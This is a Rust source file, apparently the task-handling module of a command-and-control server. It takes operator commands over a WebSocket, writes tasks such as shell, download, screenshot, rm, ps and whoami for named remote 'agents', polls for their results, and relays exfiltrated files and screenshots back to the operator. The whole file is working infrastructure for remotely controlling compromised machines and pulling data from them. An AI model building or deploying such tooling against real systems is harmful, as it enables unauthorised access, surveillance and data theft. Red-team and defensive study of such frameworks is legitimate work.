use axum::extract::ws::{Message, WebSocket};
use chrono::{Datelike, Timelike};
use log::{error, info, warn};
use std::{
    io::{Error, ErrorKind},
    sync::Arc,
};
use tokio::{
    sync::{Mutex, MutexGuard},
    time::Duration,
};

use crate::{
    server::server::Server,
    utils::{
        fs::{empty_file, read_file, write_file},
        datetime::get_datetime,
    },
};

pub async fn handle_task(
    message_text: String,
    args: Vec<String>,
    socket_lock: &mut MutexGuard<'_, WebSocket>,
) {
    let ag_name = args[1].to_owned(); // The agent name

    let check_sleeptime: Duration = Duration::from_secs(3);
    let max_check_cnt: u8 = 10;

    let task = args[2].as_str();

    match task {
        "cat" | "cd" | "download" | "info" | "ls" | "net" | "ps" | "pwd" |
        "rm" | "screenshot" | "shell" | "sleep" | "whoami" => {
            match set_task(&args) {
                Ok(_) => {},
                Err(e) => {
                    let _ = socket_lock.send(
                        Message::Text(
                            format!("[task:error] Could not set the task: {}", e.to_string())
                        )).await;
                    let _ = socket_lock.send(Message::Text("[done]".to_owned())).await;
                    return;
                }
            }

            check_task_result(
                socket_lock,
                ag_name.to_string(),
                task.to_string(),
                check_sleeptime,
                max_check_cnt,
            ).await;
        }
        _ => {
            let _ = socket_lock.send(Message::Text(format!("Unknown command: {message_text}"))).await;
            let _ = socket_lock.send(Message::Text("[done]".to_owned())).await;
            return;
        }
    }
}

fn set_task(args: &Vec<String>) -> Result<(), Error> {
    let agent_name = args[1].to_string();

    match write_file(
        format!("agents/{}/task/name", agent_name),
        args[2..].join(" ").as_bytes(),
    ) {
        Ok(_) => {
            info!("The task set successfully.");
            return Ok(());
        },
        Err(e) => {
            return Err(Error::new(ErrorKind::Other, e.to_string()));
        },
    }
}

async fn check_task_result(
    socket_lock: &mut MutexGuard<'_, WebSocket>,
    agent_name: String,
    task: String,
    sleeptime: Duration,
    max_check_cnt: u8,
) {
    let mut cnt: u8 = 0;

    loop {
        info!("Getting task result...");
        tokio::time::sleep(sleeptime).await;

        if let Ok(task_result) = read_file(
            format!("agents/{}/task/result", agent_name.to_string()))
        {
            if task_result.len() > 0 {
                info!("task result found.");
                let _ = socket_lock.send(Message::Text("[task:ok]".to_owned())).await;
                
                if task == "download" {
                    let task_result = task_result.clone();
                    // Extract the filename from the binary
                    let mut filename: Vec<u8> = Vec::new();
                    let mut contents: Vec<u8> = Vec::new();
                    let mut newline_found = false;
                    for r in task_result {
                        info!("r: {:?}", r.to_string());
                        if !newline_found {
                            if r == 10 {
                                newline_found = true;
                            } else {
                                filename.push(r);
                            }
                        } else {
                            contents.push(r);
                        }
                    }
                    let outfile = format!(
                        "agents/{}/downloads/{}",
                        agent_name.to_owned(),
                        String::from_utf8(filename).unwrap(),
                    );
                    let _ = socket_lock.send(Message::Text(
                        format!("[task:download:ok] {}", outfile)
                    )).await;

                    info!("contents: {:?}", contents);

                    let _ = socket_lock.send(Message::Binary(contents)).await;
                }
                else if task == "screenshot" {
                    let outfile = format!(
                        "agents/{}/screenshots/screenshot_{}.png",
                        agent_name.to_owned(),
                        get_datetime(""),
                    );
                    let _ = socket_lock.send(Message::Text(
                        format!("[task:screenshot:ok] {}", outfile)
                    )).await;

                    let _ = socket_lock.send(Message::Binary(task_result)).await;
                } else {
                    let _ = socket_lock.send(Message::Binary(task_result)).await;
                }

                let _ = socket_lock.send(Message::Text("[done]".to_owned())).await;

                // Initialize the task result
                empty_file(format!("agents/{}/task/result", agent_name.to_string())).unwrap();
                break;
            } else {
                warn!("task result is empty.");
                cnt += 1;
                if cnt > max_check_cnt {
                    let _ = socket_lock.send(Message::Text("[task:error] Could not get the task result.".to_owned())).await;
                    let _ = socket_lock.send(Message::Text("[done]".to_owned())).await;
                    break;
                }
            }
        } else {
            error!("Could not read `task/result` file.");
            break;
        }
    }
}